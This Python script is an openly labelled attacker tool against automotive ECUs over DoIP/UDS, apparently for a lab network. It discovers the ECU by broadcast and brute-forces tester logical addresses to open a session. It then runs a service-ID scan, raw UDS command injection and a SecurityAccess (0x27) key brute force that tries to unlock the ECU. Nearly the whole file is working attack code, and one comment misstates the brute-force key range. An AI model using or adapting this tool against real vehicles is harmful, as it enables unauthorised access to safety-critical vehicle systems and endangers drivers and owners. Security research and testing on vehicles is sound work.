#!/usr/bin/env python3
# attacker_node_doip_orchestrated.py

import socket
import struct
import time
import sys
import re
import subprocess

PORT = 13400
BROADCAST_IP = "10.0.0.255"
ATTACKER_IP = "10.0.0.3"

# Global Target Constants
TARGET_ECU_LA = 0x0001
MY_SOURCE_LA = 0x0003 
BLACKLIST_SIDS = [0x3F]

def build_header(msg_type, payload=b""):
    """Constructs the standard 8-byte DoIP header."""
    return struct.pack(">BBHI", 0x02, 0xFD, msg_type, len(payload)) + payload

def check_attacker_ip():
    """Ensures the attacker's network interface is correctly configured."""
    try:
        out = subprocess.check_output(["ip", "addr"], text=True)
        if ATTACKER_IP not in out:
            print(f"[!] Error: {ATTACKER_IP} not assigned to this node.")
            sys.exit(1)
    except: sys.exit(1)

# ======================================================
# CORE NETWORK FUNCTIONS
# ======================================================

def doip_discovery():
    """Finds the ECU IP via UDP Broadcast."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(2)
    sock.sendto(build_header(0x0001), (BROADCAST_IP, PORT))
    try:
        data, addr = sock.recvfrom(4096)
        print(f"[✔] ECU Found at {addr[0]}")
        return addr[0]
    except:
        return None
    finally:
        sock.close()

def routing_activation_enum(ecu_ip):
    """Step 1: Brute-force Logical Address to establish a TCP session."""
    print(f"\n" + "="*15 + " LA ENUMERATION " + "="*15)
    for tester_la in range(0x00, 0x21):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        try:
            sock.connect((ecu_ip, PORT))
            # Routing Activation Request (0x0005)
            payload = struct.pack(">H", tester_la) + b'\x00' + b'\x00\x00\x00\x00'
            sock.sendall(build_header(0x0005, payload))
            data = sock.recv(4096)
            if len(data) >= 13 and data[12] == 0x00:
                print(f"[✔] Found valid Tester LA: 0x{tester_la:02X}")
                return sock, tester_la
            sock.close()
        except: pass
    return None, None

# ======================================================
# ATTACK MODULES
# ======================================================

def run_sid_scan(sock, my_la):
    """Attack 1: Maps supported UDS services."""
    print(f"\n[SCAN] Mapping SIDs 0x10-0x3E...")
    found_sids = []
    for sid in range(0x10, 0x40):
        if sid in BLACKLIST_SIDS: continue
        la_header = struct.pack(">HH", my_la, TARGET_ECU_LA)
        msg = build_header(0x8001, la_header + bytes([sid, 0x00]))
        sock.sendall(msg)
        try:
            sock.settimeout(0.4)
            resp = sock.recv(4096)
            if len(resp) >= 12:
                u_resp = resp[12:]
                # Check for Positive Response or valid Negative Response
                if u_resp[0] == (sid + 0x40) or (u_resp[0] == 0x7F and u_resp[2] != 0x11):
                    print(f"  -> SID 0x{sid:02X}: SUPPORTED")
                    found_sids.append(f"0x{sid:02X}")
        except: pass
        time.sleep(0.02)
    print(f"\n[INFO] Scan complete. Supported: {', '.join(found_sids)}")

def run_manual_uds(sock, my_la):
    """Attack 2: Manual UDS Hex Injection."""
    print(f"\n[MANUAL] Enter UDS hex (e.g., 22 F1 90). Type 'back' to exit.")
    while True:
        cmd = input("UDS > ").strip().lower()
        if cmd == 'back': break
        bytes_list = re.findall(r"[0-9a-fA-F]{1,2}", cmd)
        if bytes_list:
            uds_payload = bytes(int(b, 16) for b in bytes_list)
            la_header = struct.pack(">HH", my_la, TARGET_ECU_LA)
            sock.sendall(build_header(0x8001, la_header + uds_payload))
            try:
                sock.settimeout(1.0)
                resp = sock.recv(4096)
                if len(resp) >= 12: 
                    print(f"<< RESPONSE: {resp[12:].hex().upper()}")
            except: 
                print("<< No Response")

def run_security_bruteforce(sock, my_la):
    """Attack 3: Brute force SecurityAccess (0x27) keys."""
    print(f"\n" + "="*10 + " SECURITY BRUTE FORCE (0x27) " + "="*10)
    la_header = struct.pack(">HH", my_la, TARGET_ECU_LA)
    
    # 1. Request Seed
    print("[*] Requesting Seed (27 01)...")
    msg = build_header(0x8001, la_header + b'\x27\x01')
    sock.sendall(msg)
    
    try:
        sock.settimeout(1.0)
        resp = sock.recv(4096)
        if len(resp) >= 12 and resp[12] == 0x67: # 0x67 is positive response for 0x27
            print(f"[✔] Seed Received: {resp[14:].hex().upper()}")
        else:
            print("[!] Failed to get seed. Ensure you are in the correct session (e.g., 10 03).")
            return
    except:
        print("[!] Timeout waiting for seed.")
        return

    # 2. Brute Force Key Range (11 22 33 44 to 11 22 33 A3)
    print("[*] Starting Brute Force Loop...")
    for key_suffix in range(0x00, 0x100): # 0x44 to 0xA3 inclusive
        key_bytes = b'\x11\x22\x33' + bytes([key_suffix])
        # Using \r to update the current line in terminal
        sys.stdout.write(f"\r  -> Trying Key: {key_bytes.hex().upper()}  ")
        sys.stdout.flush()
        
        # Send Key (27 02)
        msg = build_header(0x8001, la_header + b'\x27\x02' + key_bytes)
        sock.sendall(msg)
        
        try:
            sock.settimeout(0.4)
            resp = sock.recv(4096)
            if len(resp) >= 12:
                uds_resp = resp[12:]
                if uds_resp[0] == 0x67: # Success!
                    print(f"\n\n[SUCCESS] ECU UNLOCKED WITH KEY: {key_bytes.hex().upper()}")
                    return
                elif uds_resp[0] == 0x7F and uds_resp[2] == 0x36: # ExceededAttempts
                    print("\n\n[!] NRC 0x36: Exceeded attempts. ECU locked for penalty time.")
                    return
        except:
            pass
        time.sleep(0.05)
    print("\n\n[-] Range exhausted. No valid key found.")

# ======================================================
# MENUS
# ======================================================

def attack_interface(sock, my_la):
    """Sub-menu for Active Attacks."""
    while True:
        print("\n" + "—"*15 + f" ACTIVE SESSION (LA: 0x{my_la:02X}) " + "—"*15)
        print("1. Service ID Enumeration")
        print("2. Security Brute Force (0x27)")
        print("3. Manual UDS Command")
        print("4. Disconnect")
        
        choice = input("\nSelect: ").strip()
        if choice == "1":
            run_sid_scan(sock, my_la)
        elif choice == "3":
            run_manual_uds(sock, my_la)
        elif choice == "2":
            run_security_bruteforce(sock, my_la)
        elif choice == "4": 
            sock.close()
            break

def main():
    check_attacker_ip()
    ecu_ip = doip_discovery()
    if not ecu_ip:
        print("[!] Discovery failed. ECU not found.")
        return

    while True:
        print("\n" + "═"*15 + " MAIN GATEWAY " + "═"*15)
        print(f"Target: {ecu_ip}")
        print("1. Logical ID Enumeration & Entry")
        print("2. Shutdown")
        
        choice = input("\nMain Option: ").strip()
        if choice == "1":
            sock, my_la = routing_activation_enum(ecu_ip)
            if sock: 
                attack_interface(sock, my_la)
        elif choice == "2":
            sys.exit(0)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n[!] Attacker Offline.")
